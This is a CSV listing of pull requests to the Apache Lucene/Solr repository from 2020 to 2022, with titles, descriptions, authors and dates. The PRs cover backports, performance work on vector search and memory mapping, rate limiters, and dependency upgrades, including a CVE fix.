"#","No","Issue Title","Issue Details","State","Labels","User name","created","Updated"
"","1892","Improve TestConfigSetsAPI","This PR includes some improvements to TestConfigSetsAPI: * Extend `SolrCloudTestCase`: This is mainly because before, the test was creating clusters for every unit test vs. a single one for the suite * Use Mock authentication: This test is not to test the authentication framework, The `ConfigSetHandler` only needs to know if an auth plugin was configured and if credentials were provided, so the Mock components do just that. This makes the tests easier and faster *Cleanup a bunch of exceptions from the logs * Enabled back `testUploadWithLibDirective`","closed","","tflobbe","2020-09-19T00:58:04Z","2020-09-21T17:03:52Z"
"","2173","float performance tester, for demo only","This PR has a standalone test program that demonstrates some interesting performance characteristics of different data access patterns. It's not intended to be merged; I'm just putting it up here for visibility and discussion.  I have been working on improving the performance of vector KNN search, and in particular working on closing the gap with the nmslib/hnswlib reference implementation. hnswlib is coded in C++, but I believe a pure Java implementation should be able to provide pretty close performance. My goal has been to get within 2x, but we're still pretty far off from that, maybe 8x difference. Looking at the profiler, we seem to spend all our time in dot product computation, which is expected. So I wrote a simple benchmark to look more closely at this aspect and stumbled on something that really surprised me, demonstrated by this program.  The speed of the bulk dot product computation we do (a thousand or so per query, for an index of 1M vectors) is heavily influenced by memory access patterns. I'm guessing it has something to do with ability to use the CPU's memory caches, avoiding the need to go out to main memory.  In this micro-benchmark I compared a few different memory access patterns, computing 1M dot products across pairs of vectors taken from the same set. The fastest is to load all floats into a single contiguous on-heap array, and access that via pointers (which is like what `hnswlib` does). I compared that with various other models, including something simulating what we do today in `Lucene`, memory mapping a file, reading it as bytes, and converting that into a float array for each access. If we access the vector data sequentially, there is a 4x difference in speed, but even for random access there is nearly a 2x difference.  The MANY ARRAYS case pre-loads all vectors on heap, but stores them in separate arrays per vector, rather than in a single contiguous array. The SKIP ONE COPY case is like the BASELINE, but simulates what we might see if we implemented `IndexInput.readFloats`, so we could avoid one array copy that's needed today.  ## random access  pattern                  time/iteration BASELINE             0.594572 us SKIP ONE COPY  0.401249 us MANY ARRAYS    0.393746 us ONE BIG ARRAY  0.330135 us  ## sequential access  pattern                        time/iteration BASELINE                  0.443061 us MANY ARRAYS          0.188859 us SKIP ONE COPY        0.154549 us ONE BIG ARRAY        0.109249 us","open","","msokolov","2020-12-30T13:54:42Z","2020-12-30T20:43:23Z"
"","1806","LUCENE-9475: Switch validateSourcePatterns away from Ant legacy","This PR changes the legacy setp of the checkSourcePatterns task to directly execute the checker code in the running Gradle VM.  Because of Ant compatibility we preserved the old code using Ant's Groovy task. So it was executing Groovy shell inside Groovy. The code changes are minimal, further improvements are coming later.  This task has no outputs, so it's declared to run always. We may improve this, if we make the checked files and patterns a task input. Quick tests on different branches showed that task works.  This PR fixes the stupid warning caused by the groovy-inside-groovy:  ``` > Task :validateSourcePatterns Trying to override old definition of task fileScanner ```","closed","","uschindler","2020-08-30T23:40:17Z","2020-08-31T10:52:10Z"
"","1719","SOLR-14702: Remove Master and Slave from Code Base and Docs (8.x)","This PR brings the changes from https://github.com/apache/lucene-solr/pull/1711 into 8.x and add a commit to bring back compatibility. With this code change, a Solr instance running 8.7 should be able to replicate from a Solr instance running 8.x < 8.7, and a Solr instance running 9.0 should be able to replicate from an instance running 8.7 Some manual testing to check before merging this is listed here: https://issues.apache.org/jira/browse/SOLR-14708 I haven't validated the UI yet.  I kept the ""bring back compatibility"" changes in a single commit to make it easier to review the changes.  CC @MarcusSorealheis","closed","","tflobbe","2020-08-06T00:24:37Z","2020-08-07T23:10:58Z"
"","2521","Backport LUCENE-9948 LUCENE-9964","This PR backports LUCENE-9948 (Automatically detect multi and single valued..) and LUCENE-9964 (Duplicate long values ...).  Backporting just LUCENE-9964 was difficult to achieve without backporting the changes made by LUCENE-9948 in `LongValueFacetCounts` (and would've messed up the code!).  Note to reviewers: I had to make an extra change f10ca3a (apart from the backport commits) to get `ant test` running. Apart from that all changes are pretty much `cherry-pick`ed from upstream.     There was some concern about maintaining backwards compatibility in the LUCENE-9948 JIRA (as it removes a param). Is it fine if we change the API in the new Lucene 8.10 version?","closed","","gautamworah96","2021-07-02T22:33:28Z","2021-08-02T06:26:05Z"
"","2471","LUCENE-9385: (Backporting) Add FacetsConfig option to control which drill-down terms are indexed for a FacetLabel","This PR backports changes from https://github.com/apache/lucene/pull/25 into Lucene 8x  I have run `ant clean; ant precommit; ant test` to validate the changes.","closed","","zacharymorn","2021-03-27T19:17:50Z","2021-03-30T03:13:46Z"
"","2637","LUCENE-10236:  Update field-weight used in CombinedFieldQuery scoring calculation (8.11.2 Backporting)","This PR backports bug fix https://github.com/apache/lucene/pull/444 to version `8.11.2`","open","","zacharymorn","2022-01-06T06:03:01Z","2022-05-31T15:49:48Z"
"","2276","Improve backwards compatibility tests for sorted indexes.","This PR also cleans up some old checks that only applied to pre-6.0 indices.","closed","","jtibshirani","2021-01-30T01:49:43Z","2021-02-03T17:27:44Z"
"","2155","LUCENE-9641: Support for spatial relationships in LatLonPoint","This PR adds the possibility of querying a LatLonPoint using the same spatial relationships supported by LatLonShape. In order to do that, I have rename ShapeQuery class to SpatialQuery and added  a new Interface (SpatialVisitor) that can be implemented by both points and shapes.  LatLonPointInGeometryQuery has been replaced by LatLonPointQuery. LatLonDocValuesPointInGeometryQuery has been replaced by LatLonDocValuesQuery.  Performance test for LatLonPoint shows same performance as before:  ``` ||Approach||Shape||M hits/sec      ||QPS            ||Hit count      ||                  ||Dev||Base ||Diff||Dev||Base||Diff||Dev||Base||Diff|| |points|polyRussia|16.08|16.13|-0%|4.58|4.60|-0%|3508846|3508846| 0%| |points|polyMedium|9.14|9.08| 1%|112.00|111.28| 1%|2693559|2693559| 0%| |points|poly 10|87.29|87.03| 0%|55.20|55.03| 0%|355809475|355809475| 0%| ```   cc: @nknize","closed","","iverase","2020-12-17T14:43:48Z","2021-01-08T08:21:10Z"
"","1907","LUCENE-9538: Detect polygon self-intersections in the Tessellator","This PR adds a check in the tessellator to detect self-intersections so it can provide a more meaningful error to the user.  cc: @nknize","closed","","iverase","2020-09-22T08:23:19Z","2021-11-04T13:21:16Z"
"","2593","LUCENE-10154 NumericLeafComparator to define getPointValues","This patch adds getPointValues to NumericLeafComparatorsimilar how it has getNumericDocValues.  Numeric Sort optimization with points relies on the assumption that points and doc values record the same information, as we substitute iterator over doc_values with one over points.  If we override getNumericDocValues it almost certainly means that whatever PointValues NumericComparator is going to look at shouldn't be used to skip non-competitive documents. Returning null for pointValues in this case will force comparator NOT to use sort optimization with points, and continue with a traditional way of iterating over doc values.  Backport for https://github.com/apache/lucene/pull/364","closed","","mayya-sharipova","2021-10-25T14:04:05Z","2021-10-25T14:21:11Z"
"","2037","LUCENE-9583: extract separate RandomAccessVectorValues interface","This moves the random access vector interface out of VectorValues with the idea of making it less prominent. All implementations still support it, and it is required by the codec, but the public-facing VectorValues api becomes cleaner.","closed","","msokolov","2020-10-26T18:22:21Z","2020-11-13T14:15:14Z"
"","2649","Remove '-' between base.version and version.suffix and change common-build to allow the new format","This may still not be ideal/acceptable but allows for having internal version numbers in the `x.y.z.a` format instead of `x.y.z-a` format.","closed","","anshumg","2022-03-18T22:39:25Z","2022-05-31T16:20:21Z"
"","1762","LUCENE-9447: Make BEST_COMPRESSION better with highly compressible data.","This makes BEST_COMPRESSION split blocks into sub blocks and use preset dictionaries to improve compression ratios.","closed","","jpountz","2020-08-19T13:55:29Z","2020-08-26T09:04:46Z"
"","2050","SOLR-14926: Modernize and clean up search results clustering contrib.","This issue upgrades the clustering contrib to the new Carrot2 4.x line, dropping several CVE-prone dependencies along the way.  The parameters and configuration of the contrib extensions have changed. The documentation in Solr ref guide has been rewritten from scratch to be up to date.  Clustering code has been rewritten from scratch to work properly regardless of the mode (standalone, distributed).  The API has been stripped of ancient, unused, interfaces and simplified.","closed","","dweiss","2020-10-30T12:36:09Z","2020-11-03T08:31:53Z"
"","2579","SOLR-15269: Upgrade Apache HttpComponents Client to 4.5.13 to fix CVE-2020-13956","This is the fix for [CVE-2020-13956](https://nvd.nist.gov/vuln/detail/CVE-2020-13956) .","closed","","ventry1990","2021-09-21T12:44:52Z","2021-10-11T23:26:45Z"
"","2180","SOLR-15058: Enforce node_name contains colon and port and find first underscore after colon to parse context   when converting a node_name to a base URL","This is the backport from master to 8x See original PR: https://github.com/apache/lucene-solr/pull/2178","closed","","thelabdude","2021-01-05T20:20:16Z","2021-01-05T20:24:53Z"
"","1871","SOLR-14789: Rename docker tests task, adding missing credit in CHANGES","This is so that the docker tests do not run by default on the Apache Jenkins test jobs.","closed","","HoustonPutman","2020-09-14T14:32:23Z","2020-09-14T14:55:48Z"
"","1735","LUCENE spell: Implement SuggestWord.toString","This is simply an obvious toString impl on SuggestWord.","closed","","dsmiley","2020-08-11T04:55:32Z","2020-08-11T16:45:50Z"
"","2643","SOLR-9359 Make Config API work for warming queries","This is my attempt at resolving https://issues.apache.org/jira/browse/SOLR-9359 - it's still very work-in-progress, hence all the debug output etc, but if anyone has thoughts on it please let me know.  I don't know if there's a better way to do this without all the `getClass()`/`instanceof` checking?  With this patch in place it becomes possible to send `add/update-listener` commands to the Config API like this, and they take effect as expected rather than throwing a `ClassCastException`:  ``` {   ""update-listener"": {     ""name"": ""warming-queries"",     ""event"": ""newSearcher"",     ""class"": ""solr.QuerySenderListener"",     ""queries"": [       [         {           ""q"": ""foo""         },         {           ""q"": ""bar""         }       ]     ]   } } ```  Note the nested array: without that, only the first query in the list is picked up - the rest don't appear in the `getArgs().get(""queries"")` response at all. I don't know if that's fixable but I suspect it'd require more widespread changes so I've steered clear of that thus far.  (Also, this class is virtually the same in the new Solr repo - I'd raise a PR for that too, and also update the appropriate tests/docs.)","closed","","andywebb1975","2022-02-22T20:25:02Z","2022-05-31T15:51:10Z"
"","1718","SOLR-14702: Add Upgrade Notes and CHANGES entry","This is just the CHANGES.txt entries, including upgrade notes CC @MarcusSorealheis","closed","","tflobbe","2020-08-05T22:11:10Z","2020-08-07T17:12:18Z"
"","1962","SOLR-14749 Provide a clean API for cluster-level event processing","This is just the API part of the ticket, separated from PR-1758 to facilitate reviews of pure API.","closed","user-facing,","sigram","2020-10-08T10:27:11Z","2020-11-05T11:24:45Z"
"","1964","SOLR-14749: Cluster singleton part of PR-1785","This is just the `ClusterSingleton` part, with an example implementation that loads the ClusterSingleton plugins via `CustomerContainerPlugins` API. See `TestContainerPlugin` to see how it works.","closed","","sigram","2020-10-08T11:45:57Z","2020-10-22T11:29:58Z"
"","2176","Initial rewrite of MMapDirectory for JDK-16 preview (incubating) Panama APIs (>= JDK-16-ea-b32)","This is just a draft PR for a first insight on memory mapping improvements in JDK 16+.  Some background information: Starting with JDK-14, there is a new incubating module ""jdk.incubator.foreign"" that has a new, not yet stable API for accessing off-heap memory (and later it will also support calling functions using classical MethodHandles that are located in libraries like .so or .dll files). This incubator module has several versions: - first version: https://openjdk.java.net/jeps/370 (slow, very buggy and thread confinement, so making it unuseable with Lucene) - second version: https://openjdk.java.net/jeps/383 (still thread confinement, but now allows transfer of ""ownership"" to other threads; this is still impossible to use with Lucene. - third version in JDK 16: https://openjdk.java.net/jeps/393 (this version has included ""Support for shared segments""). This now allows us to safely use the same external mmaped memory from different threads and also unmap it!  This module more or less overcomes several problems: - ByteBuffer API is limited to 32bit (in fact MMapDirectory has to chunk in 1 GiB portions) - There is no official way to unmap ByteBuffers when the file is no longer used. There is a way to use `sun.misc.Unsafe` and forcefully unmap segments, but any IndexInput accessing the file from another thread will crush the JVM with SIGSEGV or SIGBUS. We learned to live with that and we happily apply the unsafe unmapping, but that's the main issue.  @uschindler had many discussions with the team at OpenJDK and finally with the third incubator, we have an API that works with Lucene. It was very fruitful discussions (thanks to @mcimadamore !)  With the third incubator we are now finally able to do some tests (especially performance). As this is an incubating module, this PR first changes a bit the build system: - disable `-Werror` for `:lucene:core` - add the incubating module to compiler of `:lucene:core` and enable it for all test builds. This is important, as you have to pass `--add-modules jdk.incubator.foreign` also at runtime!  The code basically just modifies `MMapDirectory` to use LONG instead of INT for the chunk size parameter. In addition it adds `MemorySegmentIndexInput` that is a copy of our `ByteBufferIndexInput` (still there, but unused), but using MemorySegment instead of ByteBuffer behind the scenes. It works in exactly the same way, just the try/catch blocks for supporting EOFException or moving to another segment were rewritten.  The openInput code uses `MemorySegment.mapFile()` to get a memory mapping. This method is unfortunately a bit buggy in JDK-16-ea-b30, so I added some workarounds. See JDK issues: https://bugs.openjdk.java.net/browse/JDK-8259027, https://bugs.openjdk.java.net/browse/JDK-8259028, https://bugs.openjdk.java.net/browse/JDK-8259032, https://bugs.openjdk.java.net/browse/JDK-8259034. The bugs with alignment and zero byte mmaps are fixed in b32, this PR was adapted (hacks removed).  It passes all tests and it looks like you can use it to read indexes. The default chunk size is now 16 GiB (but you can raise or lower it as you like; tests are doing this). Of course you can set it to Long.MAX_VALUE, in that case every index file is always mapped to one big memory mapping. My testing with Windows 10 have shown, that this is *not a good idea!!!*. Huge mappings fragment address space over time and as we can only use like 43 or 46 bits (depending on OS), the fragmentation will at some point kill you. So 16 GiB looks like a good compromise: Most files will be smaller than 6 GiB anyways (unless you optimize your index to one huge segment). So for most Lucene installations, the number of segments will equal the number of open files, so Elasticsearch huge user consumers will be very happy. The sysctl max_map_count may not need to be touched anymore.  In addition, this implements `readLELongs` in a better way than @jpountz did (no caching or arbitrary objects). Nevertheless, as the new MemorySegment API relies on final, unmodifiable classes and coping memory from a MemorySegment to a on-heap Java array, it requires us to wrap all those arrays using a MemorySegment each time (e.g. in `readBytes()` or `readLELongs`), there may be some overhead du to short living object allocations (those are NOT reuseable!!!). _In short: In future we should throw away on coping/loading our stuff to heap and maybe throw away IndexInput completely and base our code fully on random access. The new foreign-vector APIs will in future also be written with MemorySegment in its focus. So you can allocate a vector view on a MemorySegment and let the vectorizer fully work outside java heap inside our mmapped files! :-)_  It would be good if you could checkout this branch and try it in production.  But be aware: - You need JDK 11 to run Gradle (set `JAVA_HOME` to it) - You need JDK 16-ea-b32 (set `RUNTIME_JAVA_HOME` to it) - The lucene-core.jar will be JDK16 class files and requires JDK-16 to execute. - Also you need to add `--add-modules jdk.incubator.foreign` to the command line of your Java program/Solr server/Elasticsearch server  It would be good to get some benchmarks, especially by @rmuir or @mikemccand. _Take your time and enjoy the complexity of setting this up!_ ;-)  My plan is the following: - report any bugs or slowness, especially with Hotspot optimizations. The last time I talked to Maurizio, he taked about Hotspot not being able to fully optimize for-loops with long instead of int, so it may take some time until the full performance is there. - wait until the final version of project PANAMA-foreign goes into Java's Core Library (no module needed anymore) - add a MR-JAR for lucene-core.jar and compile the MemorySegmentIndexInput and maybe some helper classes with JDK 17/18/19 (hopefully?).  ~~In addition there are some comments in the code talking about safety (e.g., we need `IOUtils.close()` taking `AutoCloseable` instead of just `Closeable`, so we can also enfoce that all memory segments are closed after usage.~~ In addition, by default all VarHandles are aligned. By default it refuses to read a LONG from an address which is not a multiple of 8. I had to disable this feature, as all our index files are heavily unaliged. We should in meantime not only convert our files to little endian, but also make all non-compressed types (like `long[]` arrays or non-encoded integers be aligned to the correct boundaries in files). The most horrible thing I have seen is that our CFS file format starts the ""inner"" files totally unaligned. We should fix the CFSWriter to start new files always at multiples of 8 bytes. I will open an issue about this.","closed","optimization,","uschindler","2021-01-02T14:42:30Z","2021-06-07T12:15:06Z"
"","1917","LUCENE-9535: Make ByteBuffersDataOutput#ramBytesUsed run in constant-time.","This is called transitively from `DocumentsWriterFlushControl#doAfterDocument` which is synchronized and appears to be a point of contention.","closed","","jpountz","2020-09-23T16:38:41Z","2020-09-24T14:12:10Z"
"","2544","SOLR-15570: Check stored or docValues when merging fields from the Luke schema response","This is an additional change needed for: https://github.com/apache/lucene-solr/commit/1acb34753bcb771586b8b4010417e79f80952205","closed","","thelabdude","2021-08-02T17:59:25Z","2021-08-02T19:07:16Z"
"","1679","SOLR-14656: Removing autoscaling from master","This is a PR for removing autoscaling framework from master. We need this to free up @murblanc and @sigram to start afresh with the new autoscaling framework design and implementation from a clean slate.  This removes: * Autoscaling, policy, triggers etc. * withCollection handling * UTILIZENODE command * Sim framework * Suggestions tab in UI * Reference guide pages for autoscaling * autoAddReplicas feature  (This PR is meant only for master. The deprecation on 8x will be done via a separate PR.)","closed","deprecation,","chatman","2020-07-16T23:22:19Z","2020-10-08T11:15:56Z"
"","1836","LUCENE-9317: Clean up split package in analyzers-common","This is a draft pull request for review, to try to clean up package name conflicts between `analyzers-common` and `core`. Also I tried to make necessary changes as small as possible.  See https://issues.apache.org/jira/browse/LUCENE-9317 for more background.  The main changes are:  - Move analysis base classes to lucene-core (o.a.l.a) from analyzers-common (o.a.l.a.util) - Rename all service provider files (META-INF/services/...). - Move o.a.l.a.standard.StandardTokenizer to lucene-core - Split o.a.l.a.standard in analyzers-common into o.a.l.a.classic and o.a.l.a.email  With above changes, there is no package name conflicts.  - `o.a.l.a.util` and newly created `o.a.l.a.classic` and `o.a.l.a.email` only exist in `analyzers-common` - `o.a.l.a.standard` only exists in `lucene-core` - other packages are not touched.  Compiling whole Lucene/Solr main classes are fine, thanks to IDE's refactoring feature.  Tasks to be done:  - Create fake factory base classes in o.a.l.a.util for backward compatibility (?) - Fix tests - Fix gradle scripts (?)","closed","","mocobeta","2020-09-06T13:01:35Z","2020-09-28T07:54:54Z"
"","2148","SOLR-15052: Per-replica states for reducing overseer bottlenecks (branch_8x)","This is a branch_8x based PR. Design and performance numbers are mentioned in the associated JIRA.  This introduces: 1. A flag, perReplicaStates=true/false, for a collection (param to be passed during CREATE) to opt into this feature. By default this is false. 2. Support for MODIFYCOLLECTION to convert an existing collection into this new mode, or vice versa.  Important places to look: PerReplicaStates.java, ZkStateWriter.java, ZkStateReader.java, ZkController.java etc.  Co-authored-by: Noble Paul","closed","","chatman","2020-12-16T10:20:32Z","2021-01-07T15:38:24Z"
"","2487","SOLR-15383 Solr Zookeeper status page shows green even when a ZK is down","This is a backport to 8.9 of https://github.com/apache/solr/pull/103  See https://issues.apache.org/jira/browse/SOLR-15383","closed","","janhoy","2021-04-29T21:12:37Z","2021-04-29T21:47:13Z"
"","2664","[8.11] Backport - LUCENE-9580: Don't introduce collinear edges when splitting polygon","This is a backport of https://github.com/apache/lucene-solr/pull/2452 onto 8.11.  I currently use Lucene through Elasticsearch and am stuck for some time with ES 7.17 that is shipped with Lucene 8.11. I'd like to have this tessellation bug fixed in a future ES 7.17 release. This is a first step in that direction.","closed","","mhugo","2022-06-24T13:27:25Z","2022-06-27T07:34:13Z"
"","2497","LUCENE-9950: New facet counting implementation for general string doc value fields","This is a backport of #133 in apache/lucene. Only a couple very minor changes in the unit tests to work with JDK8.","closed","","gsmiller","2021-05-18T21:28:54Z","2021-05-31T13:33:54Z"
"","2507","LUCENE-9946: Support multi-value fields in range facet counting","This is a backport from `lucene/main`.","closed","","gsmiller","2021-06-07T20:43:17Z","2021-06-24T13:30:11Z"
"","2584","LUCENE-10070: Skip deleted documents during facet counting for all documents","This is a backport and identical to PR #2577 (which I managed to mangle somehow when trying to merge over changes)","closed","","gsmiller","2021-09-27T18:26:49Z","2021-10-05T12:51:50Z"
"","2018","LUCENE-9582: rename VectorValues.ScoreFunction to SearchStrategy","This is - renaming as the title says, plus a light refactoring, and adding `o.a.l.util.VectorUtil` to house the score function implementations.","closed","","msokolov","2020-10-21T22:55:19Z","2020-10-23T21:39:45Z"
"","1919","Compute RAM usage ByteBuffersDataOutput on the fly.","This helps remove the assumption that all blocks have the same size.","closed","","jpountz","2020-09-24T14:46:13Z","2020-09-28T13:09:29Z"
"","1802","LUCENE-9215: replace checkJavaDocs.py with doclet","This has the same logic as the previous python, but no longer relies upon parsing HTML output, instead using java's doclet processor.  The errors are reported like ""normal"" javadoc errors with source file name and line number and happen when running ""gradlew javadoc""  Although the ""rules"" are the same as the previous python, the python had some bugs where the checker didn't quite do exactly what we wanted, so some fixes were applied throughout.  NOTE: I'm aware this isn't perfect, but I think it is much better than what we had before.  The branch is pushed so if you want to help, push commits :)","closed","","rmuir","2020-08-30T04:02:59Z","2020-09-02T12:29:28Z"
"","1671","LUCENE-9427: Ensure unified highlighter considers all terms in fuzzy query.","This fixes a regression where if a fuzzy query corresponds to an exact match (for example it has maxEdits: 0), then the unified highlighter doesn't produce highlights for the matching terms.  The proposed fix is to always pass back an automaton when visiting a fuzzy query. This seems to match the previous behavior before the regression was introduced.","closed","","jtibshirani","2020-07-14T17:49:26Z","2020-08-06T17:54:55Z"
"","2028","LUCENE-9322: Make sure to account for vectors in SortingCodecReader.","This ensures that vector values are sorted when sorting an index after-the-fact using `SortingCodecReader`.","closed","","jtibshirani","2020-10-25T20:54:55Z","2020-10-26T15:59:02Z"
"","1841","SOLR 13528: Move Rate Limiter Configuration To Be A Plugin","This commit refactors rate limiters configuration to now be modelled as a plugin and move its configuration from web.xml to a dedicated section in solr.xml","open","","atris","2020-09-08T09:40:29Z","2020-09-09T10:56:42Z"
"","1785","Update Circuit Breaker configured as a standard plugin","This commit refactors circuit breaker configurations to use PluginInfo and reduce the footprint on SolrConfig.","closed","","atris","2020-08-26T05:21:46Z","2020-08-27T08:36:23Z"
"","2576","LUCENE-10089: Disable numeric sort optimization early","This commit moves the responsibility to disable the numeric sort optimization on comparators to the SortField. This way we don't need to apply the logic on every top field collectors.  backport for: https://github.com/apache/lucene/pull/291  Co-authored-by: Jim Ferenczi","closed","","mayya-sharipova","2021-09-16T13:15:19Z","2021-09-16T13:29:58Z"
"","1906","SOLR-13528: Implement API Based Config For Rate Limiters","This commit moves rate limiters configuration from web.xml to clusterprops.json and allows setting the configuration using a newly added command.","closed","","atris","2020-09-22T07:51:26Z","2020-09-28T09:27:07Z"
"","2131","LUCENE-9552: make sure we don't construct Illegal rectangles due to quantization","This commit just add a correction in the minLat/maxLat when it becomes invalid during quantisation.  CC: @nknize","closed","","iverase","2020-12-08T08:07:20Z","2020-12-14T11:17:18Z"
"","1686","SOLR-13528: Implement Request Rate Limiters","This commit introduces two functionalities: request rate limiting and ability to identify requests based on type (indexing, search, admin). The default rate limiter rate limits query requests based on configurable parameters which can be set in web.xml. Note that this rate limiting works at a JVM level, not a core/collection level.","closed","","atris","2020-07-21T19:47:32Z","2020-08-07T20:06:49Z"
"","2403","SOLR-15164: Implement Task Management Interface","This commit introduces the concept of task management in Solr. Tasks can be marked as cancellable (thus, trackable) and can then be listed (ps -all), cancelled and specific task's status be queried.  This commit also implements SOLR-15165 and LUCENE-9789.  Please refer to the JIRA for more information.","closed","","atris","2021-02-19T05:30:28Z","2021-04-15T08:05:55Z"
"","1737","SOLR-14615: Implement CPU Utilization Based Circuit Breaker","This commit introduces CPU based circuit breaker. This circuit breaker tracks the average CPU load per minute and triggers if the value exceeds a configurable value.  This commit also adds a specific control flag for Memory Circuit Breaker to allow enabling/disabling the same.","closed","","atris","2020-08-11T08:48:18Z","2020-08-20T07:51:47Z"
"","2494","LUCENE-9935: Enable bulk merge for stored fields with index sort","This commit enables bulk-merges (i.e., raw chunk copying) for stored fields when index sort is enabled.","closed","","dnhatn","2021-05-13T01:58:19Z","2021-05-16T20:47:24Z"
"","2059","LUCENE-9595: Make Component2D#withinPoint implementations consistent with ShapeQuery logic","This commit changes the logic of Component2D#withinPoint to return WithinRelation.NOTWITHIN when the point is inside the component.","closed","","iverase","2020-11-03T09:55:32Z","2020-11-23T08:37:55Z"
"","2395","LUCENE-9616: Add developer docs on how to update a format.","This commit adds simple guidelines on how to make a change to a file format: * Document how the 'copy-on-write' approach works with backwards-codecs * Clarify that we prefer to copy the format instead of using internal versions","closed","","jtibshirani","2021-02-18T00:21:08Z","2021-02-22T19:02:42Z"
"","1736","Harden RequestRateLimiter Tests","This commit adds higher data size and load in the test path. Also improves the asserts that are performed.","closed","","atris","2020-08-11T07:23:30Z","2020-08-11T17:12:54Z"
"","2338","LUCENE-9756: Extend FieldInfosFormat tests to cover points and vectors","This commit adds coverage to `BaseFieldInfoFormatTestCase ` for points, vectors, and the soft deletes field.","closed","","jtibshirani","2021-02-10T01:43:50Z","2021-02-10T16:57:29Z"
"","2381","SOLR-8138: Simple UI for issuing SQL queries","This code was mostly written by Michael Suzuki in PR https://github.com/apache/lucene-solr/pull/180,  i just tweaked it to load in Solr 9, and updated the version of ui-grid to the 4.10 version.     * SOLR-####:   LUCENE and SOLR must be fully capitalized. A short description helps people scanning pull requests for items they can work on.  Properly referencing the issue in the title ensures that Jira is correctly updated with code review comments and commits. -->   # Description  Add a simple page to Solr Admin for doing SQL queries.  # Solution  Delegates to the `qt=sql` handler and runs the query.  Displays results in basic table.  This UI shows how easy it is to write a SQL query that Solr doesn't like ;-(.   However, it's much easier to use than using Curl.   And may encourage more use of this powerful feature.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [X ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ X] I have created a Jira issue and added the issue ID to my pull request title. - [ X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X ] I have developed this patch against the `master` branch. - [ X] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [X ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","epugh","2021-02-16T19:24:32Z","2021-02-18T22:21:22Z"
"","2034","SOLR-14964: remove Autoscaling related withCollection and COLOCATED_WITH","This cleanup is related to SOLR-14656 ""Deprecate current autoscaling framework, remove from master"" that didn't remove everything related to ""withCollection"".","closed","","murblanc","2020-10-26T14:07:58Z","2020-10-26T18:11:18Z"
"","2087","LUCENE-9613: Split ordinals into blocks when it saves 10+% space.","This changes the way that doc values write ordinals so that Lucene splits into blocks if it would save more than 10% space, like we do for numeric fields. By the way, we are now using the same code path to write ordinals and numbers.","closed","","jpountz","2020-11-18T15:48:04Z","2021-06-16T09:45:46Z"
"","2221","LUCENE-9669: Restore Lucene70Codec","This change restores the Lucene70Codec for file format compatibility of indices that are created within the Lucene 7 major version. These indices can be opened via an expert API on DirectoryReader in read-only mode. Changes to these indices are prohibited and will be rejected by the IndexWriter. In fact, IndexWriter will not open an index that is created with a major version less than N-1 to the current major version.","closed","","s1monw","2021-01-19T10:01:53Z","2021-01-19T20:08:00Z"
"","1848","LUCENE-9515: Detach DWPT from DefaultIndexingChain","This change removes the DWPT dependency from DefaultIndexingChain and rather passes on the primitives needed for creating the chain.","closed","","s1monw","2020-09-09T08:30:15Z","2020-09-14T07:47:01Z"
"","2495","LUCENE-9827: backport avoiding wasteful recompression for small segments","This change has baked in master for a while and it is really a performance trap.   @jpountz mentioned he wanted to backport, but I figure'd I would take a stab, to try to help https://github.com/apache/lucene-solr/pull/2494 along too afterwards. This stuff is tricky, at the same time you get bad performance bugs for many use-cases if we don't fix the issues.  Note that backporting wasn't really walk in the park: * cherry-pick even with max'd out rename detection doesn't figure out LUCENE-9705 changes that well, some files had to be merged painfully. * massive style changes due to spotless in master makes for crazy diffs... * needed to bump version here (i just made it `VERSION_NUMCHUNKS`, rename later for LUCENE-9935 or bump again)  Tests pass locally here for me, but I didn't do anything exhaustive.","closed","","rmuir","2021-05-13T04:23:03Z","2021-05-13T14:32:26Z"
"","1908","LUCENE-9539: Use more compact datastructures for sorting doc-values","This change cuts over from object based datastructures to primitive / compressed datastructures.","closed","","s1monw","2020-09-22T08:52:16Z","2020-09-22T13:10:58Z"
"","2559","LUCENE-10051 Fix lucene branch_8x run ant run-task error","This bug is the same as LUCENE-10058, I filed a PR for each.","closed","","xiaoshi2013","2021-08-24T14:18:33Z","2021-09-07T14:14:24Z"
